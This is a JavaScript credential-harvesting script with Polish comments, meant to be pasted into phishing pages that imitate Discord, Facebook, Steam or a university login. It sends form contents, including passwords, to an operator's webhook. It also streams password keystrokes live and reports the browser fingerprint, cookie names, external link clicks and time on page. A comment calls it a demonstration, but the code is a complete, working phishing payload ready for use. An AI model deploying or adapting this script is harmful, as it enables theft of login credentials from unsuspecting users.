/**
 * FORKED_DATA — Capture Agent v1.0
 * ===================================
 * Wklej ten skrypt na końcu <body> każdej phishingowej strony.
 * Automatycznie przechwytuje i wysyła do operatora:
 *   - Fingerprint przeglądarki (przy załadowaniu strony)
 *   - Zawartość formularzy (przy submit)
 *   - Live typing w polach hasła (keystroke po keystroke)
 *
 * KONFIGURACJA:
 *   Zmień WEBHOOK_URL na IP laptopa operatora w sieci lokalnej.
 *   Zmień SOURCE na nazwę strony: 'discord' | 'facebook' | 'steam' | 'uczelnia'
 */
(function () {
    'use strict';

    // ── Konfiguracja ──────────────────────────────────────────
    var WEBHOOK_URL = 'http://192.168.1.100/api/webhook/capture';
    var SOURCE      = 'discord';   // zmień: facebook | steam | uczelnia | custom
    // ──────────────────────────────────────────────────────────

    function cookieMetadata() {
        var raw = '';
        try { raw = document.cookie || ''; } catch (e) {}

        var names = raw
            ? raw.split(';').map(function (part) {
                return part.split('=')[0].trim();
            }).filter(Boolean)
            : [];

        return {
            source: 'document.cookie',
            accessible: raw.length > 0,
            count: names.length,
            names: names,
            values: '[redacted]'
        };
    }

    function send(payload) {
        var body = {
            source:   SOURCE,
            url:      window.location.href,
            referrer: document.referrer,
            screen:   { w: screen.width, h: screen.height, depth: screen.colorDepth },
            tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
            lang:     navigator.language,
            platform: navigator.platform,
            cookie_metadata: cookieMetadata(),
            payload:  payload || {}
        };
        // Próba fetch (nowoczesne przeglądarki)
        if (typeof fetch !== 'undefined') {
            fetch(WEBHOOK_URL, {
                method:  'POST',
                headers: { 'Content-Type': 'application/json', 'X-Source': SOURCE },
                body:    JSON.stringify(body),
                mode:    'no-cors'   // unikamy błędu CORS w konsoli przeglądarki
            }).catch(function () {});
        } else {
            // Fallback: XMLHttpRequest (stare przeglądarki / IE)
            var xhr = new XMLHttpRequest();
            xhr.open('POST', WEBHOOK_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('X-Source', SOURCE);
            try { xhr.send(JSON.stringify(body)); } catch (e) {}
        }
    }

    // ── 1. Fingerprint przy załadowaniu ───────────────────────
    send({ _event: 'page_load', _title: document.title });

    // ── 2. Przechwytywanie formularzy (submit) ─────────────────
    document.addEventListener('submit', function (e) {
        var form  = e.target;
        var data  = { _event: 'form_submit', _form_id: form.id || form.name || 'unknown' };
        var elems = form.querySelectorAll('input, select, textarea');
        elems.forEach(function (el) {
            if (!el.name && !el.id) return;
            var key = el.name || el.id;
            // Nie pomijamy pól type="password" — to jest clou demonstracji
            data[key] = el.value;
        });
        send(data);
    }, true);  // capture phase — przechwytuje zanim handler strony anuluje event

    // ── 3. Live typing w polach hasła ─────────────────────────
    var _lastPass = {};
    document.addEventListener('input', function (e) {
        var el = e.target;
        if (!el) return;
        var isPassField = el.type === 'password'
            || (el.name && /pass|haslo|pwd|secret/i.test(el.name))
            || (el.id   && /pass|haslo|pwd|secret/i.test(el.id));
        if (!isPassField) return;

        var key = el.name || el.id || 'password';
        // Throttle: wysyłaj tylko jeśli wartość się zmieniła o 2+ znaków
        if (_lastPass[key] && Math.abs(el.value.length - _lastPass[key].length) < 2) return;
        _lastPass[key] = el.value;

        send({ _event: 'live_typing', _field: key, _live_value: el.value, _length: el.value.length });
    }, true);

    // ── 4. Przechwytywanie kliknięć w linki zewnętrzne ────────
    document.addEventListener('click', function (e) {
        var el = e.target.closest('a');
        if (!el || !el.href) return;
        var isExternal = el.hostname && el.hostname !== window.location.hostname;
        if (!isExternal) return;
        send({ _event: 'link_click', _href: el.href, _text: el.innerText.trim().slice(0, 80) });
    }, true);

    // ── 5. Heartbeat co 30 sekund (czas spędzony na stronie) ──
    var _startTime = Date.now();
    setInterval(function () {
        send({ _event: 'heartbeat', _time_on_page_s: Math.round((Date.now() - _startTime) / 1000) });
    }, 30000);

})();
